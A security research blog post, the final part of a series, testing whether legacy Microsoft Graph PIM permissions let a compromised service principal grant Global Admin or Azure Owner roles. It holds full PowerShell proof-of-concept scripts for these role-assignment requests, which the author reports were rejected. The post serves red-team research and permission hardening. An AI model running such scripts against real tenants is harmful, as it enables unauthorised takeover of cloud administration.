---
title: "Abusing PIM-related application permissions in Microsoft Graph - Part 4"
catchphrase: "Investigating legacy permissions."
image: "/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/00_Abusing_PIM_related_application_permissions_In_Microsoft_Graph.png"
last_modified_at: 2024-08-06
tags:
  - Microsoft Graph
  - Entra ID
  - Azure
  - Pentesting
  - Red-teaming
---

## Introduction

In the [first](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1) and [second](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-2) part of this series, we respectively discussed how application permissions related to eligible and active assignments in PIM can be abused to escalate to Global Admin. In the [third part](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3), we discussed how additional permissions can be abused to disable constraints put on role assignments, eligibilities and activations.

In this final part of the series, we will discuss remaining application permissions used in older versions of PIM.

### Overview of the series <a id='series-overview'></a>

This series, which discusses the abuse of PIM-related application permissions in Microsoft Graph, is structured as follows:
- [**Part 1**: Escalating to Global Admin via active assignments](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1)
- [**Part 2**: Escalating to Global Admin via eligible assignments](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-2)
- [**Part 3**: Bypassing assignment, eligibility and activation requirements](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3)
- [**Part 4**: Investigating legacy permissions](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-4)

### What permissions are addressed in this post? 

This post discusses the following MS Graph application permissions:

- [`PrivilegedAccess.ReadWrite.AzureAD`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazuread)
- [`PrivilegedAccess.ReadWrite.AzureResources`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureresources)


## Investigating remaining PIM-related permissions

The documentation describing  [PIM API history](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-apis) informs us that the PIM API has had quite a few iterations since its initial release. Currently in its third version, the documentation informs us that Iteration 1 was deprecated in June 2021, while Iteration 2 will *eventually* be deprecated in the future. 

So far in this series, we have investigated application permissions used in Iteration 3 of the PIM service. The most observant readers might have noticed that the remaining [`PrivilegedAccess.ReadWrite.AzureAD`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazuread) and [`PrivilegedAccess.ReadWrite.AzureResources`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureresources) permissions target the same backend resource (i.e. `PrivilegedAccess`) as the [`PrivilegedAccess.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureadgroup) permission, which we discussed in [part 1](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1) of the series. Therefore, it would be natural for the two remaining permissions to be usable with PIM Iteration 3. 

### Testing with PIM Iteration 3

As explained in the [PIM documentation](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-apis#pim-for-azure-resources), Azure role assignments in PIM Iteration 3 are built on top of the Azure Resource Manager (ARM) API. Thus, using the [`PrivilegedAccess.ReadWrite.AzureResources`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureresources) permission in PIM Iteration 3 is not possible.

Regarding [`PrivilegedAccess.ReadWrite.AzureAD`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazuread), the scope of the permission (i.e. `AzureAD`) indicates that it should provide access to Entra (previously Azure AD) role assignments via PIM. By re-using the PowerShell code we created to assign Entra roles in [previous parts](#series-overview) of this series, we can easily test if the permission can be used in Iteration 3 of the PIM service. Here is an example with a code snippet creating an active Entra role assignment from [part 1](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1):

[![](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/01_screenshot.png)](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/01_screenshot.png)

```
# Set SP info
$tid = ''
$appId = ''
$password = ''

# Set user info
$userId = ''

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Request active PIM role assignment 
$roleDefinitionId = '62e90394-69f5-4237-9190-012177145e10' # current: Global Admin (replace with any role Id)
$yesterday = (get-date).AddDays(-1).ToString("yyyy-MM-ddTHH:mm:ss.000Z")
$uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignmentScheduleRequests'
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}

$activeAssignment = @{
    action = 'adminAssign'
    justification = 'PoC'
    roleDefinitionId = $roleDefinitionId
    directoryScopeId = '/'
    principalId = $userId
    scheduleInfo = @{
        startDateTime = $yesterday
        expiration = @{
            type = 'NoExpiration'
        }
    }
}

$body = ConvertTo-Json -InputObject $activeAssignment
$response = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $body
$response
```

Unfortunately, all attempts to PIM-3 endpoints return an error message similar to the following, which indicates that the [`PrivilegedAccess.ReadWrite.AzureAD`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazuread) permission is **not** in the list of authorized application permissions for the endpoints in that iteration of the service:

[![](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/02_screenshot.png)](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/02_screenshot.png)

### Testing with PIM Iteration 2

The [MS Graph documentation]( https://learn.microsoft.com/en-us/graph/api/governanceroleassignmentrequest-post?view=graph-rest-beta&tabs=http) describing the use of PIM Iteration 2 contains explicit information about the remaining application permissions. This is definitely interesting! Oddly enough, the documentation indicates that both permissions seem limited to **delegated** workflows using a work or school account, while pure application-based workflows do **not** seem supported:

[![](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/03_screenshot.png)](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/03_screenshot.png)

Regardless of what the documentation states, let’s test if the [`PrivilegedAccess.ReadWrite.AzureAD`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazuread) and [`PrivilegedAccess.ReadWrite.AzureResources`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureresources) permissions can somehow be abused via Iteration 2 of the PIM API. Similar to the scenarios in [other parts](#series-overview) of this series, we will assume we have compromised a service principal with the remaining permissions, and that we control an unprivileged user account with no assigned Entra role:

[![](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/04_screenshot.png)](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/04_screenshot.png)

[![](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/05_screenshot.png)](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/05_screenshot.png)

The PowerShell code leveraging the “Harmless app” to assign the Global Admin role to our “Harmless user account” with Iteration 2 of the PIM API is as follows:

```
## Set SP info
$tid = ''
$appid = ''
$password = ''

# Set user info
$userId = ''

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Request active Entra role assignment
$roleDefinitionId = '62e90394-69f5-4237-9190-012177145e10' # current: Global Admin (replace with any role Id)
$yesterday = (get-date).AddDays(-1).ToString("yyyy-MM-ddTHH:mm:ss.000Z")
$inOneYear = (get-date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ss.000Z")

$uri = 'https://graph.microsoft.com/beta/privilegedAccess/aadRoles/roleAssignmentRequests'
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}

$eligibleAssignment = @{
    type = 'AdminAdd'
    reason = 'PoC'
    roleDefinitionId = $roleDefinitionId
    resourceId = $tid
    subjectId = $userId
    assignmentState = 'Active'
    scheduleInfo = @{
        startDateTime = $yesterday
        endDateTime = $inOneYear
        type = 'Once'
    }
}

$body = ConvertTo-Json -InputObject $eligibleAssignment
$response = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $body
$response
```

Similarly, the PowerShell code assigning the Owner role to our “Harmless user account” on an Azure subscription using PIM Iteration 2 is as follows:

```
## Set SP info
$tid = ''
$appid = ''
$password = ''

# Set user info
$userId = ''

# Set Azure info
$ownerRoleDefinitionId = '8e3af657-a8ff-443c-a75c-2fe8c4bcb635'     
$azureScopeId = '' # ID of subscription, rg, individual resource

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Request active Azure role assignment
$yesterday = (get-date).AddDays(-1).ToString("yyyy-MM-ddTHH:mm:ss.000Z")
$inOneYear = (get-date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ss.000Z")

$uri = 'https://graph.microsoft.com/beta/privilegedAccess/azureResources/roleAssignmentRequests'
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}

$eligibleAssignment = @{
    type = 'AdminAdd'
    reason = 'PoC'
    roleDefinitionId = $OwnerRoleDefinitionId
    resourceId = $azureScopeId
    subjectId = $userId
    assignmentState = 'Active'
    scheduleInfo = @{
        startDateTime = $yesterday
        endDateTime = $inOneYear
        type = 'Once'
    }
}

$body = ConvertTo-Json -InputObject $eligibleAssignment
$response = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $body
$response
```

For both endpoints, attempting to create a new role assignment in Iteration 2 of the PIM API returns the following error:

[![](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/06_screenshot.png)](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/06_screenshot.png)

This seems to indicate that the use of application permissions is not allowed by Iteration 2 of the PIM APIs. However, as the [documentation]( https://learn.microsoft.com/en-us/graph/api/governanceroleassignmentrequest-post?view=graph-rest-beta&tabs=http) states, using permissions as delegated was no problem.

### Testing with PIM Iteration 1

Despite being deprecated, testing the [`PrivilegedAccess.ReadWrite.AzureAD`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazuread) and [`PrivilegedAccess.ReadWrite.AzureResources`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureresources) permissions with Iteration 1 of the PIM API is worth a shot, if they can be abused this way.

As expected however, GET requests to any PIM-1 endpoint return a "403 Forbidden" response with the following error message:

[![](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/07_screenshot.png)](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/07_screenshot.png)

Interesting enough, we could interpret the `TenantEnabledInAadRoleMigration` error code as an indicator that our tenant has been enrolled for migration to newer iterations of PIM, implying that older tenants created *before* the deprecation may have *not* been migrated. However, it is important to note that the above PowerShell code has been tested in a tenant created long before the deprecation of PIM Iteration 1 in [June 2021](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-apis#iteration-1--deprecated). It is therefore unlikely that tenants with PIM-1 endpoints still enabled exist at all.

When investigating the endpoints further, the use of any HTTP method other than GET returns a "500 Internal Server Error", indicating that the backend functions handling PIM-1 requests have probably been removed entirely from the code base:

[![](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/08_screenshot.png)](/assets/images/blog/2024-08-06-abusing-pim-related-application-permissions-part-4/08_screenshot.png)

For reference, here is the PowerShell code I used for the base GET request:

```
## Set SP info
$tid = ''
$appid = ''
$password = ''

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Request active Entra role assignment
$roleDefinitionId = '62e90394-69f5-4237-9190-012177145e10' # current: Global Admin (replace with any role Id)

$uri = "https://graph.microsoft.com/beta/privilegedRoles/$roleDefinitionId/settings"
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}

$response = Invoke-WebRequest -Method Get -Uri $uri -Headers $headers
$response
```

## Conclusion

Based on the observations described in this post, I have not found a scenario where a compromised service principal with the granted [`PrivilegedAccess.ReadWrite.AzureAD`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazuread) or [`PrivilegedAccess.ReadWrite.AzureResources`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedaccessreadwriteazureresources) application permission can be abused for privilege escalation. However, I encourage other researchers to verify and dig deeper in those permissions to see if something else is possible.

This concludes our series. I hope it clarified the use of PIM-related application permissions, how they can be abused to escalate to Global Admin, and why they should be classified as Tier-0.
